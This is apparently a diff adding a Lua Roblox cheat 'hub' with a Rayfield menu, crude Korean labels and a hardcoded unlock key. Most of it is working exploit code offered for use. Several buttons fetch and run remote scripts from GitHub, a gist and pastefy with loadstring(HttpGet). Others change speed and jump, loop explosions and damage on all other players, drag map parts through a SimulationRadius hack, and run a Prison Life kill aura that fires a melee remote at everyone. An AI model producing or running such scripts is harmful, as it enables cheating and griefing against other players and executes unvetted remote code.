@@ -1,0 +1,307 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "개트롤 HUB",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = "기다려어어ㅓㅓ어어어어ㅓㅓ엉ㅋㅋㅋㅋㅋㅋㅋ",
+   LoadingSubtitle = "by:개좇같은 로블록스 핵 선생님",
+   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Hub"
+   },
+
+   Discord = {
+      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+
+   KeySystem = true, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "키 얻어ㅓㅓ어어어엉ㅇ엉ㅋㅋㅋㅋㅋㅋ",
+      Subtitle = "개트롤 허브에 오신걸 환영햌ㅋㅋㅋㅋㅋㅋㅋ",
+      Note = "키 새끼 : 씨발새끼개트롤", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"씨발새끼개트롤"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+local Tab = Window:CreateTab("플레이어를 개조시키는 메인탭ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "어드민부터 싸아아앜ㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Callback = function()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+   end,
+})
+
+local Slider = Tab:CreateSlider({
+   Name = "달려어어어ㅓㅓ엉엉ㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Range = {1, 800},
+   Increment = 1,
+   Suffix = "달려어엉ㅋㅋㅋㅋㅋㅋ",
+   CurrentValue = 16,
+   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+   end,
+})
+
+local Slider = Tab:CreateSlider({
+   Name = "쪔프행애ㅐ애ㅐ앵앵ㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Range = {2, 9999},
+   Increment = 2,
+   Suffix = "쪔프해ㅎㅐ앵ㅋㅋㅋㅋㅋㅋ",
+   CurrentValue = 50,
+   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+   game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
+   end,
+})
+
+local Tab = Window:CreateTab("이건 개트롤 탭이란닼ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "애니메이션으로 딴사람들의 징그러움을 보여주짘ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Callback = function()
+   loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/f018928d2f010789a150b4924e279b16/raw/8de399eb9cbccbde430fcd37270cd4ff171f8b8e/AnimationGUI.txt"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "폭팔해애ㅐㅐ애애애앵ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Callback = function()
+   local Players = game:GetService("Players")
+local Debris = game:GetService("Debris")
+
+-- Function to apply effects to all players except the one running the script
+local function handlePlayers()
+    -- Loop through all players in the game
+    for _, player in pairs(Players:GetPlayers()) do
+        -- Skip the player running the script (replace "YourPlayerName" with your actual player name)
+        if player.Name ~= "YourPlayerName" then
+            -- Ensure the player has a character and humanoid
+            if player.Character and player.Character:FindFirstChild("Humanoid") then
+                local humanoid = player.Character:FindFirstChild("Humanoid")
+
+                -- Create a Big Bang effect (Explosion)
+                local explosion = Instance.new("Explosion")
+                explosion.Position = player.Character.HumanoidRootPart.Position  -- Explosion at player's position
+                explosion.BlastRadius = 15  -- Set the radius of the explosion (adjust as needed)
+                explosion.BlastPressure = 5000  -- Pressure applied by the explosion (adjust for intensity)
+                explosion.Parent = workspace
+                Debris:AddItem(explosion, 5)  -- Clean up the explosion after 5 seconds
+
+                -- Apply 100 damage every 0.03 seconds
+                local head = player.Character:FindFirstChild("Head")
+                if head then
+                    -- Apply damage every 0.03 seconds
+                    spawn(function()
+                        while player.Character and player.Character:FindFirstChild("Humanoid") do
+                            -- Apply damage
+                            humanoid:TakeDamage(100)  -- Apply 100 damage
+                            wait(0.03)  -- Wait 0.03 seconds before applying damage again
+                        end
+                    end)
+                end
+            end
+        end
+    end
+end
+-- Infinite loop to continuously apply effects every 0.01 seconds
+while true do
+    handlePlayers()
+    wait(0.01)  -- Adjust the delay here to control how often the loop runs (0.01 second for faster updates)
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "트롤해애ㅐ애애ㅐㅐ앵ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Callback = function()
+   loadstring(game:HttpGet("https://pastefy.app/NQUCwCYI/raw"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "맵부셔ㅕㅕㅕ여여ㅕㅇ영엉ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Callback = function()
+   --[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+ 
+local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+ 
+local Folder = Instance.new("Folder", Workspace)
+local Part = Instance.new("Part", Folder)
+local Attachment1 = Instance.new("Attachment", Part)
+Part.Anchored = true
+Part.CanCollide = false
+Part.Transparency = 1
+ 
+if not getgenv().Network then
+    getgenv().Network = {
+        BaseParts = {},
+        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
+    }
+ 
+    Network.RetainPart = function(Part)
+        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(Workspace) then
+            table.insert(Network.BaseParts, Part)
+            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+            Part.CanCollide = false
+        end
+    end
+ 
+    local function EnablePartControl()
+        LocalPlayer.ReplicationFocus = Workspace
+        RunService.Heartbeat:Connect(function()
+            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
+            for _, Part in pairs(Network.BaseParts) do
+                if Part:IsDescendantOf(Workspace) then
+                    Part.Velocity = Network.Velocity
+                end
+            end
+        end)
+    end
+ 
+    EnablePartControl()
+end
+ 
+local function ForcePart(v)
+    if v:IsA("Part") and not v.Anchored and not v.Parent:FindFirstChild("Humanoid") and not v.Parent:FindFirstChild("Head") and v.Name ~= "Handle" then
+        for _, x in next, v:GetChildren() do
+            if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
+                x:Destroy()
+            end
+        end
+        if v:FindFirstChild("Attachment") then
+            v:FindFirstChild("Attachment"):Destroy()
+        end
+        if v:FindFirstChild("AlignPosition") then
+            v:FindFirstChild("AlignPosition"):Destroy()
+        end
+        if v:FindFirstChild("Torque") then
+            v:FindFirstChild("Torque"):Destroy()
+        end
+        v.CanCollide = false
+        local Torque = Instance.new("Torque", v)
+        Torque.Torque = Vector3.new(100000, 100000, 100000)
+        local AlignPosition = Instance.new("AlignPosition", v)
+        local Attachment2 = Instance.new("Attachment", v)
+        Torque.Attachment0 = Attachment2
+        AlignPosition.MaxForce = 9999999999999999
+        AlignPosition.MaxVelocity = math.huge
+        AlignPosition.Responsiveness = 200
+        AlignPosition.Attachment0 = Attachment2
+        AlignPosition.Attachment1 = Attachment1
+    end
+end
+ 
+local blackHoleActive = true
+ 
+local function toggleBlackHole()
+    blackHoleActive = not blackHoleActive
+    if blackHoleActive then
+        for _, v in next, Workspace:GetDescendants() do
+            ForcePart(v)
+        end
+ 
+        Workspace.DescendantAdded:Connect(function(v)
+            if blackHoleActive then
+                ForcePart(v)
+            end
+        end)
+ 
+        spawn(function()
+            while blackHoleActive and RunService.RenderStepped:Wait() do
+                Attachment1.WorldCFrame = humanoidRootPart.CFrame
+            end
+        end)
+    end
+end
+ 
+local function createControlButton()
+    local screenGui = Instance.new("ScreenGui")
+    local button = Instance.new("TextButton")
+ 
+    screenGui.Name = "BlackHoleControlGUI"
+    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+ 
+    button.Name = "ToggleBlackHoleButton"
+    button.Size = UDim2.new(0, 200, 0, 50)
+    button.Position = UDim2.new(0.5, -100, 0, 100)
+    button.Text = "🔒"
+    button.Parent = screenGui
+ 
+    button.MouseButton1Click:Connect(function()
+        toggleBlackHole()
+        if blackHoleActive then
+            button.Text = "🔒"
+        else
+            button.Text = "내쪽으로 당겨ㅕ어ㅓㅓㅓ어어ㅓㅇ엉ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ"
+        end
+    end)
+end
+ 
+createControlButton()
+toggleBlackHole()
+   end,
+})
+
+local Tab = Window:CreateTab("프리즌 라이프 트롤해애ㅐ애ㅐㅐ애앵ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "킬아해ㅐㅐ애애ㅐ애애앵ㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Callback = function()
+   mainRemotes = game.ReplicatedStorage
+meleeRemote = mainRemotes['meleeEvent']
+
+killAura = true
+
+contextactionservice = game.ContextActionService
+
+function toggleKillAura(actionName, inputState, inputObject)
+print('Doing the action : ' .. actionName)
+if inputState == Enum.UserInputState.Begin then
+if killAura == true then
+killAura = false
+else
+killAura = true
+end
+end
+end
+
+contextactionservice:BindAction('ToggleKillAura', toggleKillAura, false, Enum.KeyCode.K)
+
+while wait() do
+if killAura == true then
+for _, plr in pairs (game:GetService('Players'):GetChildren()) do
+if plr.Name ~= game.Players.LocalPlayer.Name then
+meleeRemote:FireServer(plr)
+end
+end
+end
+end
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "여기에서 더 많은 기능들을 볼수있단다~ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
+   end,
+})
